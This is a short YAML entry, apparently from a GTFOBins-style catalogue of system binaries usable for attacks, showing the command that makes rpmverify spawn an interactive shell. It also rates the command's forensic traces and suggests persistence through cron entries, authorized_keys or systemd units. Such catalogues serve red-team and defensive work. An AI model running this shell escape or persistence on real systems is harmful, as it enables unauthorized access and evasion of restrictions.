---
name: rpmverify
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: rpmverify --eval '%(/bin/sh 1>&2)'
references:
- https://gtfobins.github.io/gtfobins/rpmverify/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
